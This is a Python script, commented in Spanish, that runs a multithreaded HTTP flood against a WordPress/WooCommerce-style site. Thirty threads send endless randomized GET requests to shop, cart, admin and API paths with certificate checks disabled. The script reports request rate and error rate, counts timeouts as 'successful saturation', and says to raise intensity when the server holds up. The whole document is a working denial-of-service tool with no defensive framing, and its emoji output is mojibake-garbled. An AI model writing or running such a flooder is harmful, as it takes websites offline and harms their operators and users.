```python
import requests
import threading
import time
import random

# Desactivar warnings SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedAttack:
    def __init__(self):
        self.requests_made = 0
        self.errors = 0
        self.active_threads = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        
    def aggressive_attack(self, thread_id):
        with self.lock:
            self.active_threads += 1
            
        url = "https://sssab.test"
        attack_count = 0
        
        while True:
            try:
                # Request GET con parÃ¡metros aleatorios
                endpoint = random.choice([
                    "/", "/?s=test", "/wp-json/", "/wp-admin/", 
                    "/?page_id=9", "/shop/", "/cart/", "/my-account/"
                ])
                
                response = requests.get(
                    url + endpoint + f"?rand={random.randint(1000,9999)}",
                    headers={'User-Agent': 'Mozilla/5.0'}, 
                    verify=False, 
                    timeout=3  # Timeout mÃ¡s corto
                )
                
                with self.lock:
                    self.requests_made += 1
                attack_count += 1
                
            except requests.exceptions.Timeout:
                with self.lock:
                    self.errors += 1
            except Exception as e:
                with self.lock:
                    self.errors += 1

    def status_monitor(self):
        last_requests = 0
        last_errors = 0
        
        while True:
            time.sleep(5)  # Esperar ANTES de calcular
            
            current_requests = self.requests_made
            current_errors = self.errors
            elapsed = time.time() - self.start_time
            
            # Calcular RPS
            requests_since_last = current_requests - last_requests
            rps = requests_since_last / 5 if elapsed > 0 else 0
            
            # Calcular tasa de error (con protecciÃ³n divisiÃ³n por cero)
            total_attempts = current_requests + current_errors
            error_rate = (current_errors / total_attempts * 100) if total_attempts > 0 else 0
            
            print(f"\nğŸ“Š === ESTADO DEL ATAQUE ===")
            print(f"â±ï¸  Tiempo: {elapsed:.1f}s")
            print(f"ğŸš€ Requests exitosos: {current_requests}")
            print(f"âŒ Errores/Timeouts: {current_errors}")
            print(f"ğŸ“ˆ Requests/segundo: {rps:.1f}")
            print(f"ğŸ§µ Hilos activos: {self.active_threads}")
            print(f"ğŸ’¥ Tasa de error: {error_rate:.1f}%")
            
            # AnÃ¡lisis de impacto
            if error_rate > 80:
                print("ğŸ¯ âš ï¸  SERVIDOR GRAVEMENTE SATURADO")
            elif error_rate > 50:
                print("ğŸ¯ ğŸ”¥ SERVIDOR BAJO ALTA CARGA")
            elif current_errors > current_requests * 3:
                print("ğŸ¯ ğŸ’€ SERVIDOR POSIBLEMENTE CAÃDO")
                
            # Actualizar Ãºltimos valores
            last_requests = current_requests
            last_errors = current_errors

# EJECUCIÃ“N PRINCIPAL MEJORADA
print("ğŸ’€ INICIANDO ATAQUE AVANZADO CORREGIDO")
print("âš ï¸  Los timeouts = SATURACIÃ“N EXITOSA")
time.sleep(2)

attack = AdvancedAttack()

# Iniciar MONITOR primero
monitor_thread = threading.Thread(target=attack.status_monitor, daemon=True)
monitor_thread.start()

# Iniciar HILOS gradualmente
print("ğŸ”¥ Iniciando hilos de ataque...")
for i in range(20):  # 20 hilos para empezar
    threading.Thread(target=attack.aggressive_attack, args=(i,), daemon=True).start()
    time.sleep(0.05)  # Espaciar mÃ¡s

print("ğŸ¯ Ataque en progreso. Presiona Ctrl+C para detener")

try:
    # Agregar mÃ¡s hilos gradualmente
    time.sleep(10)
    print("ğŸ”¥ Agregando 10 hilos mÃ¡s...")
    for i in range(20, 30):
        threading.Thread(target=attack.aggressive_attack, args=(i,), daemon=True).start()
        
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nğŸ›‘ ATAQUE DETENIDO")
    elapsed = time.time() - attack.start_time
    total_attempts = attack.requests_made + attack.errors
    error_rate = (attack.errors / total_attempts * 100) if total_attempts > 0 else 0
    
    print(f"ğŸ“ˆ RESUMEN FINAL:")
    print(f"â±ï¸  DuraciÃ³n: {elapsed:.1f}s")
    print(f"ğŸ“¨ Requests exitosos: {attack.requests_made}")
    print(f"ğŸ’¥ Errores: {attack.errors}")
    print(f"ğŸ¯ Tasa de error: {error_rate:.1f}%")
    
    if error_rate > 70:
        print("âœ… Â¡ATAQUE EXITOSO! Servidor saturado")
    else:
        print("âš ï¸  Servidor resistente, aumentar intensidad")
```
